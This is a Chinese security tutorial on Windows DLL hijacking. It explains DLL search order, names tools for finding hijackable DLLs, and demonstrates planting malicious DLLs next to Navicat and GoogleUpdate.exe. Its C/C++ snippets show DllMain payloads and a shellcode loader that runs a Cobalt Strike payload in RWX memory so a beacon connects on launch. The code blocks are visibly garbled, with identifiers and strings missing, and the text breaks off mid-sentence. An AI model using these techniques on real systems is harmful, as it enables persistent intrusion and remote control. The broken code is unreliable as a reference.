---
title: 技术研究 – 从零开始学习 DLL 劫持
url: https://www.secpulse.com/archives/200972.html
source: 安全脉搏
date: 2023-05-25
fetch_date: 2025-10-04T11:37:45.052319
---

# 技术研究 – 从零开始学习 DLL 劫持

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 技术研究 – 从零开始学习 DLL 劫持

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-05-24

14,143

以下文章来源于亿人安全 ，作者Hyyrent

# DLL 劫持

## DLL 简介

> 在 Windows 中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即 DLL 文件，放置于系统中。当我们执行某一个程序时，相应的 DLL 文件就会被调用。一个应用程序可使用多个 DLL 文件，一个 DLL 文件也可能被不同的应用程序使用，这样的 DLL 文件被称为共享 DLL 文件。

## DLL 加载顺序

如果程序需要加载一个相对路径的 dll 文件，它将从当前目录下尝试查找，如果找不到，则按照如下顺序寻找：

### windows xp sp2 之前

Windows 查找 DLL 的目录以及对应的顺序：

* 进程对应的应用程序所在目录；
* 当前目录（Current Directory）；
* 系统目录（通过 GetSystemDirectory 获取）；
* 16 位系统目录；
* Windows 目录（通过 GetWindowsDirectory 获取）；
* PATH 环境变量中的各个目录；

### windows xp sp2 之后

Windows 查找 DLL 的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：

默认注册表为：HKEY\_LOCAL\_MACHINESystemCurrentControlSetControlSession ManagerSafeDllSearchMode，其键值为 1

* 进程对应的应用程序所在目录（可理解为程序安装目录比如 C:ProgramFilesuTorrent）
* 系统目录（即 % windir% system32）；
* 16 位系统目录（即 % windir% system）；
* Windows 目录（即 % windir%）；
* 当前目录（运行的某个文件所在目录，比如 C:Documents and SettingsAdministratorDesktoptest）；
* PATH 环境变量中的各个目录；

### windows 7 以上版本

从 Windows7 之后，微软为了更进一步的防御系统的 DLL 被劫持，将一些容易被劫持的系统 DLL 写进了一个注册表项中，该项下的 DLL 文件就会被禁止从 EXE 自身所在的目录下调用，而只能从系统目录 SYSTEM32 目录下调用，其注册表位置：

`HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlSession ManagerKnownDLLs`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909378.png)

## 自动化挖掘

### 批量寻找劫持

https://github.com/wietze/windows-dll-hijacking

PLAINTEXT

|  |  |
| --- | --- |
| ``` 1 ``` | ``` python generate_pmc_files.py ``` |

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909379.png)

### 单个查找劫持

https://github.com/knight0x07/ImpulsiveDLLHijack

编译完成后，把 Prerequisites 文件夹里的内容拷贝至 ImpulsiveDLLHijack 项目里

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909381.png)

PLAINTEXT

|  |  |
| --- | --- |
| ``` 1 ``` | ``` ImpulsiveDLLHijack.exe -path xxx.exe ``` |

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909383.png)

这里使用 `navicat` 进行测试，可见运行的时候会加载 `C:UsersdyyAppDataLocalProgramsPythonPython38Scriptsoci.dll`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909384.png)

使用 cs 生成恶意 dll，重命名为 `oci.dll` 后放置到该目录下

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909388.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909390.png)

## 手动挖掘

Process Monitor 查找可用 dll，设置如下图所示

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-16849093901.png)

配置完可以保存导出配置，下次直接导入使用

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909391.png)

使用 `GoogleUpdate.exe` 进行测试，运行程序 filter 加载所使用的 dll 文件

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909392.png)

这里可以看出来，当 `GoogleUpdate.exe` 程序运行的时候，会调用当前目录下的 `goopdate.dll` 文件

编写一个基础的弹窗 dll

JAVA

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ``` | ``` #include <Windows.h> #pragma    BOOL APIENTRY  {      (ul_reason_for_call) {      DLL_PROCESS_ATTACH:      DLL_PROCESS_DETACH:      DLL_THREAD_ATTACH:      DLL_THREAD_DETACH:         ;     }      TRUE; }   extern  __declspec(dllexport) int  {     MessageBox(NULL, , , MB_OK);      ; } ``` |

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909393.png)

## 弹计算器

JAVA

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ``` | ``` #include  #include<stdlib.h>  BOOL APIENTRY     {      (ul_reason_for_call)     {      DLL_PROCESS_ATTACH:         system();      DLL_THREAD_ATTACH:      DLL_THREAD_DETACH:      DLL_PROCESS_DETACH:         ;     }      TRUE; } ``` |

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909394.png)

## CS 上线

cs 生成 c 的 payload

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909396.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909397.png)

生成的 `payload` 填入到下面相应的位置上

CPP

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ``` | ``` HANDLE hThread = ; ; unsigned char shellcode[] = ;    {     LPVOID lpBase = (, (shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);     (lpBase, shellcode, (shellcode));     JMP_SHELLCODE jmp_shellcode = (JMP_SHELLCODE)lpBase;     ();      ; }     {      (dwReason == DLL_PROCESS_ATTACH)     {         (hModule);         hThread = (, , jmp_shellcode, , , );      }       (dwReason == DLL_PROCESS_DETACH)     {     }       TRUE; } ``` |

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909400.png)

运行 `navicat` 程序就会上线

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909401.png)

## DLL 转发劫持

有时候当我们替换 dll 后，虽然可以执行命令，但是会产生报错

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200972-1684909402.png)

这时候我们可以使用 `AheadLib` 工具，使恶意的 DLL 将原有的函数转发到原 DLL 中并且释放恶意代码

打开工具导入 dll 文件，会生成相应的 cpp 文件

> 直接转发函数，我们只能控制 DllMain 即调用原 DLL 时触发的行为可控
> 即时调用函数，可以在处理加载 DLL 时，调用具...